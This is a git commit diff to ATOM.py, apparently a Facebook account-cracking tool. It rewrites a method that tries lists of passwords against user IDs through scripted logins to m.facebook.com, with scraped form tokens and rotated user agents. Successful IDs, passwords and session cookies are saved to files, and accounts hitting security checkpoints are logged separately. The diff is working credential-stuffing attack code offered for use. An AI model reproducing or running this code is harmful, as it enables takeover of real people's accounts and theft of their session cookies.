d5145fcd8a4f19a540f712e4d9e5532d12adcfb9
DESTROYED-ATOM <164036812+DESTROYED-ATOM@users.noreply.github.com>
2024-03-20 11:05:21 +0530

    Update ATOM.py

--- ATOM.py
+++ ATOM.py
@@ -497,43 +497,54 @@ def _M3_(ids,pasx):
                 pass
 #━━━━━━━━━━━━━[MATHOD━P━M4]━━━━━━━━━━━━━━━━# host
 
-def _M4_(ids,pasc):
+def _M4_(ids,pasx):
         global loop
         global ok
         global agents
         sys.stdout.write(f'\r\r\033[38;5;48m{G}[BITHIKA-M4] {GR}{loop}\033[38;5;48m|OK➤\033[38;5;46m{len(ok)}')
         sys.stdout.flush()
         try:
-                for ps in pasc:
+                for ps in pasx:
                         session = requests.Session()
-                        pro = random.choice(ugen)
-                        ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":pro,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-                        p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+ids+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
-                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-                        koki+=' m_pixel_ratio=2.625; wd=412x756'
-                        heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':pro,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)  
-                        po=session.cookies.get_dict().keys()
-                        if 'c_user' in po:
+                        KING=random.choice(ugen) 
+                        free_fb = session.get('https://m.facebook.com/').text
+                        had={ 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'DNT': '1',
+                        'Alt-Used': 'm.facebook.com',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'none',
+                        'Sec-Fetch-User': '?1',
+                        'Pragma': 'no-cache',
+                        'Cache-Control': 'no-cache',}
+                        info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,'pass':ps,"login":"Log In"}
+                        os="https://m.facebook.com/login.php/?login_attempt=1&display=popup"
+                        lo = session.post(url=os,headers=had,data=info).text
+                        BLACK=session.cookies.get_dict().keys()
+                        if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                 uid = re.findall('c_user=(.*);xs', coki)[0]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
-                                print(f"\r\033[38;5;46mCOOKIES=[🤖]: \033[1;37m{coki}\33[1;36m")
-                             #######   print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
-                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
+                                print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
+                               ######৳ print(f'\033[38;5;196m─────────────────────────────────────────────────\033[1;37m')
+                                open('/sdcard/ATOM-M1-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 ok.append(uid)
                                 break
-                        elif 'checkpoint' in po:
-                        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                        	    cid = coki[24:39]
-                        	    print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
-                        	    open('/sdcard/ATOM-M6-CP.txt','a').write(uid+'|'+ps+'\n')
-                        	    cp.append(cid)
-                        	    break
+                        elif 'checkpoint' in BLACK:
+                                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                                cid = coki[24:39]
+                                print(f'\r\r {R}[ATOM-CP] {uid} | {ps}')
+                                open('/sdcard/ATOM-M2-CP.txt','a').write(uid+'|'+ps+'\n')
+                                cp.append(cid)
+                                break
                         else:continue
                 loop+=1
-        except:pass
+        except Exception as e: 
+              pass
 #━━━━━━━━━━━━━[MATHOD━FREE━M5]━━━━━━━━━━━━━━━━# b-graph 
 def _M5_(ids,pasd):
         global loop
